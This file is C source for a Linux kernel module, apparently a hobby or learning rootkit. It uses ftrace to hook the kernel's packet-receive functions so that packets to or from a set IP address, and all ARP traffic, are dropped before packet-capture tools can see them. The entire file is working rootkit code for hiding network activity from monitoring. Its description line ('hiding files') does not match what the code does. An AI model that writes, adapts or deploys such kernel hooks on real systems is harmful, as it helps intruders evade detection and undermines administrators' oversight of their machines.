
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>


 // the ip addr to filter (127.0.0.1)
#define ipv4_filter_sorce 0x100007f
#define ipv4_filter_dest 0x100007f

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
MODULE_VERSION("0.02");

static asmlinkage long (*original_packet_rcv)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);
static asmlinkage long (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);
static asmlinkage long (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, 
    struct packet_type *, struct net_device *);



int packet_check(struct sk_buff *skb)
{
    // this is the filter function that check the packet paramaters and return 1 if it need to hide or 0 if not

    /* check for ipv4 with specipt sender or reciver */
    if (skb->protocol == htons(ETH_P_IP)) {
        /* get ipv4 header */
        struct iphdr *header = ip_hdr(skb);
        printk("got ip4 message from %x", header->saddr);
        /* look for source and destination address */
        if( ipv4_filter_sorce == header->saddr  || ipv4_filter_dest == header->daddr) {
            printk("IPV4 SENDER %x I4 IN LIST", header->saddr);

            /* ip in list, should be hidden */
            return 1;
        }
    }

    /* check for arp */
    if (skb->protocol == htons(ETH_P_ARP)) {
        struct ethhdr *eth = (struct ethhdr *) skb_mac_header(skb);
        unsigned char *src_mac = eth->h_source;
        printk("got arp message from  MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
       src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
            return 1;
    }

    /* check for ipv6 */
    // if(skb->protocol == htons(ETH_P_IPV6)) {
    //     /* get ipv6 header */
    //     struct ipv6hdr *header = ipv6_hdr(skb);

    //     /* look for source and destination address */
    //     if(find_packet_ipv6(header->saddr.s6_addr) || find_packet_ipv6(header->daddr.s6_addr)) {
    //         printk("IPV6 SENDER %pI6 IN LIST", 
    //             header->saddr.s6_addr);

    //         /* ip in list, should be hidden */
    //         return 1;
    //     }
    // }

    /* no ipv4 or ipv6 packet or not found in list */
    return 0;
}


int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP packet_rcv");
        return NF_DROP;
    }

    ret = original_packet_rcv(skb, dev, pt, orig_dev);



    return ret;
}

int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP tpacket_rcv");
        return NF_DROP;
    }

    ret = original_tpacket_rcv(skb, dev, pt, orig_dev);



    return ret;
}

int hook_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, 
    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if(packet_check(skb)) {
        printk("PACKET DROP packet_rcv_spkt");
        return NF_DROP;
    }

    ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);



    return ret;
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("packet_rcv", hook_packet_rcv, &original_packet_rcv),
    HOOK("tpacket_rcv", hook_tpacket_rcv, &original_tpacket_rcv),
    HOOK("packet_rcv_spkt", hook_packet_rcv_spkt, &original_packet_rcv_spkt),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
